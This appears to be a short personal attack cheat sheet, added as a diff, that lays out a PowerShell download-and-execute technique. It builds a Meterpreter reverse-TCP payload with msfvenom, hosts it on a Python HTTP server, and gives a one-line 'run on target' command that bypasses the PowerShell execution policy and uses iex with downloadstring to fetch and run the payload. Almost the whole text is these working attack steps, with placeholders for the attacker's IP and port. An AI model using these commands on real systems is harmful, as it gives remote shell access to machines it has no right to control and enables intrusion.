@@ -1,0 +1,21 @@
+PS_DLX
+----------
+# payload
+msfvenom -p windows/x64/meterpreter/reverse_tcp -f psh-cmd -o <file_name> LHOST=<IP> LPORT=<PORT> 
+
+vim <file_name>
+# remove everthying before "powershell"
+
+#python server
+
+mkdir www
+cp <file_name> www/.
+cd www 
+
+python -m http.server <port>
+
+# run on target
+powershell -ex bypass -c "iex(new-object net.webclient).downloadstring('http://<IP>:<port>/<payload>')"
+ 
+
+++++++++++  
